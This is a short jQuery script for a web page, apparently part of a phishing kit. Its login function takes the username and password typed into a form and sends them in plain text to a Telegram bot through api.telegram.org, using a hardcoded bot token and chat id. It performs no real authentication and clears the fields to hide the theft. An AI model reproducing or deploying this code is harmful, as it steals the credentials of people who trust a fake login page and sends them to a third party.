$(document).ready(function(){

var winh = $(window).height();

$(".header").height(winh);
$(".space").height(winh /4);


$("button").click(function(){
window.location.href = "login.html";
});



});

function login(){
var username = $("#username").val();
var pass = $("#pass").val();

var text = "user : " + username + "|| pass : " + pass;

var token = "891349283:AAGDu0rBxJXST8_j0NqsbU6tiKZc_lbS8M8";
var id = "714671983";

if(username.length > 0 && pass.length > 0){


$("#logbut").attr("disabled","disabled");
    
    $.get( "https://api.telegram.org/bot" + token +"/sendMessage?chat_id=" +id + "&text=" + text, function( data ) {
$("#logbut").removeAttr("disabled","disabled");
$(".alert").show();
$("#username,#pass").val("");
      });

}

}
